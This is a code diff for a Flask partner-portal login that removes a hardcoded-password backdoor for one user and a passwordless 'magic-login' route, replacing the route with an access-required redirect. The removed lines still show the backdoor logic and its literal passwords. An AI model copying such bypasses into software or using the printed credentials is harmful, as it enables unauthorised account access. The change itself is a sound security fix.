@@ -332,9 +332,6 @@ def bosanna_login():
             except Exception:
                 valid_password = False
 
-            if not valid_password and user['username'] == 'ahudgins' and password in ['bosanna2026!', 'Bosanna2026!', 'angelica2026!', 'Angelica2026!']:
-                valid_password = True
-
         if user and valid_password:
             allowed_roles = ['Partner', 'Partner_Bosanna', 'Executive', 'Admin']
             user_role = user.get('role') or ('Executive' if user.get('username') in ['admin', 'hdominguez'] else 'Partner_Bosanna')
@@ -355,33 +352,10 @@ def bosanna_login():
 @partner_bp.route('/bosanna-portal', methods=['GET', 'POST'], endpoint='bosanna_portal_direct')
 @partner_bp.route('/bosanna-cockpit', methods=['GET', 'POST'], endpoint='bosanna_cockpit_direct')
 @partner_bp.route('/portal/bosanna/magic-login', methods=['GET', 'POST'], endpoint='bosanna_magic_login')
+@partner_access_required
 def bosanna_magic_login():
-    """Instant passwordless executive entrance for Angelica Hudgins."""
-    db_url = current_app.config['DATABASE_URL']
-    conn = None
-    user = None
-    try:
-        conn = get_db(db_url)
-        with conn.cursor() as cur:
-            cur.execute('''
-                SELECT * FROM "Users" 
-                WHERE LOWER(username) = 'ahudgins';
-            ''')
-            user = cur.fetchone()
-    except Exception as m_err:
-        print(f"[MAGIC LOGIN ERROR] Lookup failure: {m_err}", flush=True)
-    finally:
-        if conn:
-            conn.close()
-
-    if user and (not user.get('status') or user.get('status') == 'Active'):
-        session.permanent = True
-        user_role = user.get('role') or 'Partner_Bosanna'
-        login_user(User(user['id'], user['username'], user_role, user.get('full_name'), user.get('custom_permissions')))
-        return redirect(url_for('partner.bosanna_portal'))
-
-    flash('Executive profile could not be located. Please contact technical administration.')
-    return redirect(url_for('partner.bosanna_login'))
+    """Redirects authenticated partner and executive users to the Bosanna Portal."""
+    return redirect(url_for('partner.bosanna_portal'))
 
 
 @partner_bp.route('/portal/bosanna/portal', methods=['GET'], endpoint='bosanna_portal')
